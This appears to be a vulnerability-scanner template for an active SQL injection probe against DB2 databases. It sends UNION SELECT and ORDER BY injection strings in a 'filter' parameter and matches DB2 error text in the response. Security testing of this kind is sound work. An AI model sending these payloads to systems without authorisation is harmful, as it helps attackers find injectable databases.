id: sqli6-db2-13
name: 'SQLi db2 probe in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - ''' UNION SELECT NULL,NULL,NULL--'
        - '1'' ORDER BY 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
